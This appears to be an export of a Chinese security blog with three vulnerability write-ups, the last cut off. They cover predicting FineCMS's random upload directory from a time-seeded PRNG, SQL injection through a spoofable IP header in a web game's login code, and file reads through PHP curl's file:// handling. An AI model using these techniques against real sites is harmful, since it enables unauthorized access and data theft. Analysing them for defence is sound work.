<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">srand(time());</div></pre></td></tr></table></figure>
<p>时候这里的time()就等于返回的时间戳。</p>
<p>当种子设置为时间戳之后，之后所有的基于PRNG的函数全部变的可计算了。</p>
<p>举个例子：</p>
<p>FineCMS2.0.1有一个文件解压getshell漏洞</p>
<p>详情可以看</p>
<p>/bugs/wooyun-2010-064128</p>
<p>这篇文章。</p>
<p>官方的修复方案是将目录名称随机</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$temp = APP_ROOT.<span class="string">'cache/attack/'</span>.md5(uniqid().rand(<span class="number">0</span>, <span class="number">9999</span>)).<span class="string">'/'</span></div></pre></td></tr></table></figure>
<p>让攻击者不可猜测，从而即使攻击者上传了shell之后，也找不到执行的目录。</p>
<p>假设开启了数据库储存session选项之后。那么即使官方用了两个随机函数，一个加密函数，都变辣鸡。</p>
<p>我们先来看uniqid()的php的内核源码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div></pre></td><td class="code"><pre><div class="line">PHP_FUNCTION(uniqid)</div><div class="line"></div><div class="line">&#123;</div><div class="line"></div><div class="line"><span class="keyword">char</span> *prefix = <span class="string">""</span>;</div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">if</span> defined(__CYGWIN__)</span></div><div class="line"></div><div class="line">zend_bool more_entropy = <span class="number">1</span>;</div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">else</span></span></div><div class="line"></div><div class="line">zend_bool more_entropy = <span class="number">0</span>;</div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></div><div class="line"></div><div class="line"><span class="keyword">char</span> *uniqid;</div><div class="line"></div><div class="line"><span class="keyword">int</span> sec, usec, prefix_len = <span class="number">0</span>;</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">struct</span> <span class="title">timeval</span> <span class="title">tv</span>;</span></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> (zend_parse_parameters(ZEND_NUM_ARGS() TSRMLS_CC, <span class="string">"|sb"</span>, &amp;prefix, &amp;prefix_len,</div><div class="line"></div><div class="line">&amp;more_entropy)) &#123;</div><div class="line"></div><div class="line"><span class="keyword">return</span>;</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">if</span> HAVE_USLEEP &amp;&amp; !defined(PHP_WIN32)</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> (!more_entropy) &#123;</div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">if</span> defined(__CYGWIN__)</span></div><div class="line"></div><div class="line">php_error_docref(<span class="literal">NULL</span> TSRMLS_CC, E_WARNING, <span class="string">"You must use 'more entropy' under CYGWIN"</span>);</div><div class="line"></div><div class="line">RETURN_FALSE;</div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">else</span></span></div><div class="line"></div><div class="line">usleep(<span class="number">1</span>);</div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></div><div class="line"></div><div class="line">gettimeofday((struct timeval *) &amp;tv, (struct timezone *) <span class="literal">NULL</span>);</div><div class="line"></div><div class="line">sec = (<span class="keyword">int</span>) tv.tv_sec;</div><div class="line"></div><div class="line">usec = (<span class="keyword">int</span>) (tv.tv_usec % <span class="number">0x100000</span>);</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">/* The max value usec can have is 0xF423F, so we use only five hex</span></div><div class="line"><span class="comment"></span></div><div class="line"><span class="comment">* digits for usecs.</span></div><div class="line"><span class="comment"></span></div><div class="line"><span class="comment">*/</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> (more_entropy) &#123;</div><div class="line"></div><div class="line">spprintf(&amp;uniqid, <span class="number">0</span>, <span class="string">"%s%08x%05x%.8F"</span>, prefix, sec, usec, php_combined_lcg(TSRMLS_C) * <span class="number">10</span>);</div><div class="line"></div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line"></div><div class="line">spprintf(&amp;uniqid, <span class="number">0</span>, <span class="string">"%s%08x%05x"</span>, prefix, sec, usec);</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">RETURN_STRING(uniqid, <span class="number">0</span>);</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></div><div class="line"></div><div class="line"><span class="comment">/* &#125;&#125;&#125; */</span></div></pre></td></tr></table></figure>
<p>可以看到uniqid()在默认情况下会生成13位”随机”数字，实际上就是将当前的时间戳变为16进制，8位秒以上的16进制+5位微秒时间戳而已。呵呵没错，又是时间戳。</p>
<p>那么这时候就会变成，13位里面我们可以确定8位,剩下5位是我们不可见的。</p>
<p>然后rand()的值，我们知道了种子，可以列出到达这里的rand()的随机值［根据rand()调用的次数］</p>
<p>那么md5(uniqid().rand(0,9999))</p>
<p>这个加密方法，实际上就变成了跑5位数0-F字典的问题了。</p>
<p>如果说框架没有问题，想跑出来这个这个目录个人电脑要进行上亿次的请求，这几乎不可能。但是当框架帮我们固定了随机数种子之后，一切都变得so easy。</p>
<p>同理如果cookie生成，csrf生成用到了rand()函数，全部都会被击溃。</p>
<p>千里之堤，溃于蚁穴。</p>
<p>攻击者发送请求<br><img src="/old/2017/10/10/CodeIgniter-Vul/1046971727.png" alt="85D4315C-97CC-4B00-8857-BCD997B78171.png"></p>
<p>根据服务器返回的时间，转为时间戳<br><img src="/old/2017/10/10/CodeIgniter-Vul/1380875732.png" alt="E51B8868-12C2-405F-8ED5-05F26BBEF52D.png"></p>
<p>根据时间戳计算加密过后的目录</p>
<p><img src="/old/2017/10/10/CodeIgniter-Vul/2410727766.png" alt="1CD3FE40-8187-4BFD-A37C-E3D5256C97F3.png"></p>
<p>服务器上攻击者攻击之后生成的目录</p>
<p><img src="/old/2017/10/10/CodeIgniter-Vul/1478495625.png" alt="F50ED45C-F8E9-447A-9ED2-49CBE8DCE5EF.png"></p>
]]></content>
      
        <categories>
            
            <category> 漏洞分析 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> PHP </tag>
            
            <tag> 漏洞分析 </tag>
            
            <tag> 伪随机数 </tag>
            
            <tag> CodeIgniter </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[网页游戏《BR大逃杀》一枚小0Day]]></title>
      <url>/2017/10/10/BR%E5%A4%A7%E9%80%83%E6%9D%80/</url>
      <content type="html"><![CDATA[<p>呵呵，昨晚和初中同学叙旧，两个人无聊找了一款网页游戏BR大逃杀玩，今天把这个网页游戏下下来简单审计了一下源码。</p>
<a id="more"></a>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">error_reporting(E_ERROR | E_WARNING | E_PARSE);</div><div class="line">set_magic_quotes_runtime(<span class="number">0</span>);</div><div class="line"><span class="comment">//ini_set('date.timezone','Asia/Shanghai');</span></div><div class="line">$now = time();</div><div class="line">define(<span class="string">'IN_GAME'</span>, <span class="keyword">TRUE</span>);</div><div class="line">define(<span class="string">'GAME_ROOT'</span>, substr(dirname(<span class="keyword">__FILE__</span>), <span class="number">0</span>, <span class="number">0</span>));</div><div class="line">define(<span class="string">'GAMENAME'</span>, <span class="string">'bra'</span>);</div><div class="line"><span class="keyword">if</span>(PHP_VERSION &lt; <span class="string">'4.3.0'</span>) &#123;</div><div class="line"><span class="keyword">exit</span>(<span class="string">'PHP version must &gt;= 4.3.0!'</span>);</div><div class="line">&#125;</div><div class="line"><span class="keyword">require_once</span> GAME_ROOT.<span class="string">'./include/global.func.php'</span>;</div><div class="line"><span class="keyword">require_once</span> GAME_ROOT.<span class="string">'./config.inc.php'</span>;</div><div class="line"></div><div class="line">extract(gaddslashes($_COOKIE));</div><div class="line">extract(gaddslashes($_POST));</div><div class="line">extract(gaddslashes($_GET));</div><div class="line"></div><div class="line"><span class="keyword">if</span>($attackevasive) &#123;</div><div class="line"><span class="keyword">include_once</span> GAME_ROOT.<span class="string">'./include/security.inc.php'</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">if</span>($gzipcompress &amp;&amp; function_exists(<span class="string">'ob_gzhandler'</span>) &amp;&amp; CURSCRIPT != <span class="string">'wap'</span>) &#123;</div><div class="line">ob_start(<span class="string">'ob_gzhandler'</span>);</div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line">$gzipcompress = <span class="number">0</span>;</div><div class="line">ob_start();</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">require_once</span> GAME_ROOT.<span class="string">'./include/db_'</span>.$database.<span class="string">'.class.php'</span>;</div><div class="line">$db = <span class="keyword">new</span> dbstuff;</div><div class="line">$db-&gt;connect($dbhost, $dbuser, $dbpw, $dbname, $pconnect);</div><div class="line"><span class="keyword">unset</span>($dbhost, $dbuser, $dbpw, $dbname, $pconnect);</div><div class="line">$db-&gt;select_db($dbname);</div><div class="line"><span class="keyword">require_once</span> GAME_ROOT.<span class="string">'./gamedata/system.php'</span>;</div><div class="line"><span class="keyword">if</span>(!$username||!$password)&#123;</div><div class="line">gexit($_ERROR[<span class="string">'login_info'</span>],<span class="keyword">__file__</span>,<span class="keyword">__line__</span>);</div><div class="line">&#125;<span class="keyword">else</span>&#123;</div><div class="line"><span class="keyword">include_once</span> GAME_ROOT.<span class="string">'./gamedata/system.php'</span>;</div><div class="line"></div><div class="line"><span class="keyword">if</span>(getenv(<span class="string">'HTTP_CLIENT_IP'</span>) &amp;&amp; strcasecmp(getenv(<span class="string">'HTTP_CLIENT_IP'</span>), <span class="string">'unknown'</span>)) &#123;</div><div class="line">$onlineip = getenv(<span class="string">'HTTP_CLIENT_IP'</span>);</div><div class="line">&#125; <span class="keyword">elseif</span>(getenv(<span class="string">'HTTP_X_FORWARDED_FOR'</span>) &amp;&amp; strcasecmp(getenv(<span class="string">'HTTP_X_FORWARDED_FOR'</span>), <span class="string">'unknown'</span>)) &#123;</div><div class="line">$onlineip = getenv(<span class="string">'HTTP_X_FORWARDED_FOR'</span>);</div><div class="line">&#125; <span class="keyword">elseif</span>(getenv(<span class="string">'REMOTE_ADDR'</span>) &amp;&amp; strcasecmp(getenv(<span class="string">'REMOTE_ADDR'</span>), <span class="string">'unknown'</span>)) &#123;</div><div class="line">$onlineip = getenv(<span class="string">'REMOTE_ADDR'</span>);</div><div class="line">&#125; <span class="keyword">elseif</span>(<span class="keyword">isset</span>($_SERVER[<span class="string">'REMOTE_ADDR'</span>]) &amp;&amp; $_SERVER[<span class="string">'REMOTE_ADDR'</span>] &amp;&amp; strcasecmp($_SERVER[<span class="string">'REMOTE_ADDR'</span>], <span class="string">'unknown'</span>)) &#123;</div><div class="line">$onlineip = $_SERVER[<span class="string">'REMOTE_ADDR'</span>];</div><div class="line">&#125;</div><div class="line"></div><div class="line">$password = md5($password);</div><div class="line">$groupid = <span class="number">1</span>;</div><div class="line">$credits = <span class="number">0</span>;</div><div class="line">$gender = <span class="number">0</span>;</div><div class="line">$str = <span class="string">"SELECT * FROM &#123;$tablepre&#125;users WHERE username = '$username'"</span>;</div><div class="line">$result = $db-&gt;query(<span class="string">"SELECT * FROM &#123;$tablepre&#125;users WHERE username = '$username'"</span>);</div><div class="line"><span class="keyword">if</span>(!$db-&gt;num_rows($result)) &#123;</div><div class="line">$groupid = <span class="number">1</span>;</div><div class="line">$str = <span class="string">"INSERT INTO &#123;$tablepre&#125;users (username,`password`,groupid,ip,credits,gender) VALUES ('$username', '$password', '$groupid', '$onlineip', '$credits', '$gender')"</span>;</div><div class="line">$db-&gt;query(<span class="string">"INSERT INTO &#123;$tablepre&#125;users (username,`password`,groupid,ip,credits,gender) VALUES ('$username', '$password', '$groupid', '$onlineip', '$credits', '$gender')"</span>);</div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line">$userdata = $db-&gt;fetch_array($result);</div><div class="line"><span class="keyword">if</span>($userdata[<span class="string">'groupid'</span>] &lt;= <span class="number">0</span>)&#123;</div><div class="line">gexit($_ERROR[<span class="string">'user_ban'</span>],<span class="keyword">__file__</span>,<span class="keyword">__line__</span>);</div><div class="line">&#125; <span class="keyword">elseif</span>($userdata[<span class="string">'password'</span>] != $password) &#123;</div><div class="line">gexit($_ERROR[<span class="string">'login_check'</span>],<span class="keyword">__file__</span>,<span class="keyword">__line__</span>);</div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line"></div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">gsetcookie(<span class="string">'user'</span>,$username);</div><div class="line">gsetcookie(<span class="string">'pass'</span>,$password);</div><div class="line">&#125;</div><div class="line"></div><div class="line">Header(<span class="string">"Location: index.php"</span>);</div><div class="line"><span class="keyword">exit</span>();</div><div class="line"></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<p>以上这些是login.php的源码，程序员从15-17行进行了addslash()操作并且用了extract()函数解压出来，这两个函数都有相关的安全风险。<br>addslash()函数在数据库为gbk的条件下可以用宽字节注入，extract函数的话可以用数组进行变量覆盖（日常感谢黑哥等老一辈黑阔）</p>
<p>看了一下下面进行sql查询的地方，因为数据库设置的是utf8格式的，所以暂时先放弃了宽字节注入的想法。</p>
<p>接下来我发现下面的insert语句里面需要插入一个ip，根据以往的经验来看，php获取ip一共有3种方式，其中的2种方式都是有问题的。<br>使用X-Forward-For和HTTP_CLIENT_IP这两种都是客户端可以伪造的。<br>于是看一下ip是怎么取得的，获取ip的代码是如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span>(getenv(<span class="string">'HTTP_CLIENT_IP'</span>) &amp;&amp; strcasecmp(getenv(<span class="string">'HTTP_CLIENT_IP'</span>), <span class="string">'unknown'</span>)) &#123;</div><div class="line">$onlineip = getenv(<span class="string">'HTTP_CLIENT_IP'</span>);</div><div class="line">&#125; <span class="keyword">elseif</span>(getenv(<span class="string">'HTTP_X_FORWARDED_FOR'</span>) &amp;&amp; strcasecmp(getenv(<span class="string">'HTTP_X_FORWARDED_FOR'</span>), <span class="string">'unknown'</span>)) &#123;</div><div class="line">$onlineip = getenv(<span class="string">'HTTP_X_FORWARDED_FOR'</span>);</div><div class="line">&#125; <span class="keyword">elseif</span>(getenv(<span class="string">'REMOTE_ADDR'</span>) &amp;&amp; strcasecmp(getenv(<span class="string">'REMOTE_ADDR'</span>), <span class="string">'unknown'</span>)) &#123;</div><div class="line">$onlineip = getenv(<span class="string">'REMOTE_ADDR'</span>);</div><div class="line">&#125; <span class="keyword">elseif</span>(<span class="keyword">isset</span>($_SERVER[<span class="string">'REMOTE_ADDR'</span>]) &amp;&amp; $_SERVER[<span class="string">'REMOTE_ADDR'</span>] &amp;&amp; strcasecmp($_SERVER[<span class="string">'REMOTE_ADDR'</span>], <span class="string">'unknown'</span>)) &#123;</div><div class="line">$onlineip = $_SERVER[<span class="string">'REMOTE_ADDR'</span>];</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>个人觉得程序猿没有注意到获取顺序，应该是<code>$_SERVER[&#39;REMOTE_ADDR&#39;]</code>放在判断语句的第一个，不然就不会有下面的问题了。<br>上面那串代码获取了$onlineip，但要注意到$onlineip是从<code>$_SERVER</code>这个php的超全局变量获取的。程序开头只addslash了3个超全局变量，忽略了这个，所以下面insert语句是可以注入的。<br>所以接下来就可以用报错注入来注入了。<br><img src="/old/2017/10/10/BR大逃杀/2689502967.png" alt="F93EDEF9-CC09-479E-81F9-B5F70267FC74.png"><br><img src="/old/2017/10/10/BR大逃杀/2275247145.png" alt="66FF604A-1512-40CD-8858-E74C5ECA32CD.png"></p>
]]></content>
      
        <categories>
            
            <category> 漏洞分析 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> PHP </tag>
            
            <tag> 漏洞分析 </tag>
            
            <tag> 注入 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Curl类库解析url安全简读]]></title>
      <url>/2017/10/10/Curl%E7%B1%BB%E5%BA%93%E8%A7%A3%E6%9E%90url%E5%AE%89%E5%85%A8%E7%AE%80%E8%AF%BB/</url>
      <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><h3 id="什么是CURL"><a href="#什么是CURL" class="headerlink" title="什么是CURL"></a>什么是CURL</h3><p>curl是利用URL语法在命令行方式下工作的开源文件传输工具。它被广泛应用在Unix、多种Linux发行版中，并且有DOS和Win32、Win64下的移植版本。</p>
<a id="more"></a>
<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p>CURL是十分强大的开源命令行工具,支持以下这些协议</p>
<blockquote>
<p>DICT, FILE, FTP, FTPS, Gopher, HTTP, HTTPS, IMAP, IMAPS, LDAP, LDAPS, POP3, POP3S, RTMP, RTSP, SCP, SFTP, SMB, SMTP, SMTPS, Telnet and TFTP.</p>
</blockquote>
<p>wooyun案例:<br><a href="http://wooyun.org/bugs/wooyun-2010-012" target="_blank" rel="external">人人网的分享网页功能存在诸多安全漏洞 </a><br><a href="http://wooyun.org/bugs/wooyun-2010-03070" target="_blank" rel="external">微博–微收藏多处任意文件读取漏洞</a></p>
<p>许多程序猿使用CURL类库的时候是不对传入的URL进行协议鉴别的.</p>
<p>举个例子在最新版的骑士CMS中(20160604)有一个调用curl类库的函数</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">https_request</span><span class="params">($url,$data = null)</span></span>&#123;</div><div class="line">$curl = curl_init();</div><div class="line">curl_setopt($curl, CURLOPT_URL, $url);</div><div class="line">curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, <span class="keyword">FALSE</span>);</div><div class="line">curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, <span class="keyword">FALSE</span>);</div><div class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($data))&#123;</div><div class="line">curl_setopt($curl, CURLOPT_POST, <span class="number">1</span>);</div><div class="line">curl_setopt($curl, CURLOPT_POSTFIELDS, $data);</div><div class="line">&#125;</div><div class="line">curl_setopt($curl, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</div><div class="line">$output = curl_exec($curl);</div><div class="line">curl_close($curl);</div><div class="line"><span class="keyword">return</span> $output;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>把这段代码单独扒拉下来稍作修改,然后调用一下可以很明显的看到,直接使用curl调用了<code>file://</code>协议对文件进行了读取</p>
<p>我建立了一个测试文件路径为<code>/etc/test</code></p>
<p><img src="/old/2017/10/10/Curl类库解析url安全简读/2484440844.png" alt="ED4CB388-15DA-40D8-B525-FB49B6442F85.png"></p>
<p>测试文件里面将CURLOPT_URL设置为<code>file:///etc/test</code></p>
<p>再访问测试文件<a href="http://test/test.php" target="_blank" rel="external">http://test/test.php</a></p>
<p><img src="/old/2017/10/10/Curl类库解析url安全简读/1530548505.png" alt="3EE11F19-37AE-492F-B572-9630A6D9DDFF.png"></p>
<p>可以看到原本打算进行http请求的函数转变成了文件读取.</p>
<p>但是上面仅仅是最一般的情况,更多的情况是url是经过拼接之后再传入CURLOPT_URL这个选项的.</p>
<p>for example:</p>
<p>有一个api接口<br><a href="http://someapi.com/api.php?token={user_api_token}&amp;other_string" target="_blank" rel="external">http://someapi.com/api.php?token={user_api_token}&amp;other_string</a><br>通过拼接用户的api_token来传入curl类库进行http请求等操作.</p>
<p>想要将使用http协议变成file协议来读取文件<br>,我们最好能够能覆盖前面一部分,并且摒弃后面一部分.</p>
<p>那么想要做到上面的部分就要了解curl_setopt()这个函数的源代码了.</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">PHP_FUNCTION(curl_setopt)</div><div class="line">&#123;</div><div class="line">zval       *zid, **zvalue;</div><div class="line">long        options;</div><div class="line">php_curl   *ch;</div><div class="line"></div><div class="line"><span class="keyword">if</span> (zend_parse_parameters(ZEND_NUM_ARGS() TSRMLS_CC, <span class="string">"rlZ"</span>, &amp;zid, &amp;options, &amp;zvalue) == FAILURE) &#123;</div><div class="line"><span class="keyword">return</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line">ZEND_FETCH_RESOURCE(ch, php_curl *, &amp;zid, <span class="number">-1</span>, le_curl_name, le_curl);</div><div class="line"></div><div class="line"><span class="keyword">if</span> (options &lt;= <span class="number">0</span> &amp;&amp; options != CURLOPT_SAFE_UPLOAD) &#123;</div><div class="line">php_error_docref(<span class="keyword">NULL</span> TSRMLS_CC, E_WARNING, <span class="string">"Invalid curl configuration option"</span>);</div><div class="line">RETURN_FALSE;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">if</span> (_php_curl_setopt(ch, options, zvalue TSRMLS_CC) == SUCCESS) &#123;</div><div class="line">RETURN_TRUE;</div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line">RETURN_FALSE;</div><div class="line">&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>(看懂PHP的函数源码需要一点PHP扩展方面的知识,推荐看看鸟哥laruence的博客和百度)</p>
<p>里面调用了<code>_php_curl_setopt()</code>这个函数,其中进入的是这个case</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">case</span> CURLOPT_URL:</div><div class="line">convert_to_string_ex(zvalue);</div><div class="line"><span class="keyword">return</span> php_curl_option_url(ch, Z_STRVAL_PP(zvalue), Z_STRLEN_PP(zvalue) TSRMLS_CC);</div></pre></td></tr></table></figure>
<p>这个函数中唯一一个调用的函数原型贴在下面了<br>ext/curl/interface.c:206行<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">php_curl_option_url</span><span class="params">(php_curl *ch, <span class="keyword">const</span> <span class="keyword">char</span> *url, <span class="keyword">const</span> <span class="keyword">int</span> len TSRMLS_DC)</span> <span class="comment">/* &#123;&#123;&#123; */</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line"><span class="comment">/* Disable file:// if open_basedir are used */</span></div><div class="line"><span class="keyword">if</span> (PG(open_basedir) &amp;&amp; *PG(open_basedir)) &#123;</div><div class="line"><span class="meta">#<span class="meta-keyword">if</span> LIBCURL_VERSION_NUM &gt;= 0x071304</span></div><div class="line">curl_easy_setopt(ch-&gt;cp, CURLOPT_PROTOCOLS, CURLPROTO_ALL &amp; ~CURLPROTO_FILE);</div><div class="line"><span class="meta">#<span class="meta-keyword">else</span></span></div><div class="line">php_url *uri;</div><div class="line"></div><div class="line"><span class="keyword">if</span> (!(uri = php_url_parse_ex(url, len))) &#123;</div><div class="line">php_error_docref(<span class="literal">NULL</span> TSRMLS_CC, E_WARNING, <span class="string">"Invalid URL '%s'"</span>, url);</div><div class="line"><span class="keyword">return</span> FAILURE;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">if</span> (uri-&gt;scheme &amp;&amp; !strncasecmp(<span class="string">"file"</span>, uri-&gt;scheme, <span class="keyword">sizeof</span>(<span class="string">"file"</span>))) &#123;</div><div class="line">php_error_docref(<span class="literal">NULL</span> TSRMLS_CC, E_WARNING, <span class="string">"Protocol 'file' disabled in cURL"</span>);</div><div class="line">php_url_free(uri);</div><div class="line"><span class="keyword">return</span> FAILURE;</div><div class="line">&#125;</div><div class="line">php_url_free(uri);</div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">return</span> php_curl_option_str(ch, CURLOPT_URL, url, len, <span class="number">0</span> TSRMLS_CC);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>可以看到程序首先就判断了是否设置了<br>open_basedir,如果设置了将直接防止使用<code>file:</code>协议进行文件的读取,所以可以考虑作为一个防御方案:)</p>
<p>在进入第一个if判断语句,首先php里面的curl类库调用了php源码里php_url_parse_ex这个函数来解析url,php的函数parse_url()函数也是调用的php_url_parse_ex这个函数来解析url.</p>
<p>但是主要php_url_parse_ex这个函数在这里的作用就是解析这个url使用了什么协议,再根据解析出来的协议使用值<code>uri-&gt;scheme</code>对比是否是<code>file</code>协议,相当于在上层做了一个判断,并不是解析好了之后将处理过后的值放入curl类库里的函数再解析一遍url.</p>
<p>经过追踪函数定位到lib/url.c:parseurlandfillconn()为curl类库里面进行url解析的函数</p>
